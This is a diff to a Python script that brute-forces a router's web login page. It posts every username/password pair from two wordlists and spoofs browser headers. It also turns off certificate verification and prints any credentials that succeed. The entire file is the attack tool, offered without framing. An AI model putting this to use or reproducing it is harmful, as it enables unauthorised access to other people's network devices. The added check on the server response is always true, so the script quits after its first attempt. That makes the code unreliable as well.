@@ -1,31 +1,55 @@
 import requests
 import sys
 
-url = "http://192.168.1.1"  # Check address.md for routers' default IP address.
+url = "http://192.168.1.1"  # Check the address in address.md for the default IP address of routers.
 
-expression = b"incorrect"  # changed to bytes-like object.
+expression = {b"error", b"incorrect", b"failure", b"try", b"again", b"invalid", b"upgrade", b"outdated", b"browser"}  # Changed to bytes-like object.
 
-def brute(username, password, combinations_tested):
+def brute(username, password, combinations_tested, total_combinations):
     data = {'username': username, 'password': password}
-    r = requests.post(url, data=data)
-    #print("Server response: ", r.content)  # (optional) print server response
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Connection': 'keep-alive',
+        'Cache-Control': 'max-age=0',
+        'Upgrade-Insecure-Requests': '1',
+        'DNT': '1',  # Do Not Track
+        'Referer': 'http://192.168.1.1/',  # Update with the correct URL
+        'Origin': 'http://192.168.1.1/',  # Adding Origin header
+    }
+    try:
+        r = requests.post(url, data=data, headers=headers, verify=False)  # Disable SSL certificate verification
+    except requests.exceptions.SSLError as e:
+        print("SSL Error:", e)
+        sys.exit(1)
     combinations_tested += 1
-    sys.stdout.write("\rCombinations tested: %d" % combinations_tested)
+    sys.stdout.write("\rCombinations tested: {}/{}".format(combinations_tested, total_combinations))
     sys.stdout.flush()
-    if expression not in r.content:
-        print("Brute Forcing...")
+    if b"upgrade" or b"outdated" or b"browser" in r.content:
+        print("\nError:", r.content)
+        sys.exit()
+    if not any(item in r.content for item in expression):
+        print("\nBrute Forcing...")
         print("[+] Username: ", username)
         print("[+] Password: ", password)
+        print("Server Response:", r.content)  # Print server response content
         sys.exit()
-    return combinations_tested # add quantity of combinations
-
+    return combinations_tested
 
 def main():
-    usernames = [u.strip() for u in open("username.txt", "r").readlines()] # add username.txt usage 
+    combinations_tested = 0
+    usernames = [u.strip() for u in open("username.txt", "r").readlines()]
     passwords = [p.strip() for p in open("password.txt", "r").readlines()]
-    for username in usernames:
-        for password in passwords:
-            brute(username, password)  
+    total_combinations = len(usernames) * len(passwords)
+    try:
+        for username in usernames:
+            for password in passwords:
+                combinations_tested = brute(username, password, combinations_tested, total_combinations)
+    except KeyboardInterrupt:
+        print("\n\033[91mExiting...\033[0m")  # Print "Exiting..." in red
 
 if __name__ == '__main__':
+    requests.packages.urllib3.disable_warnings()
     main()
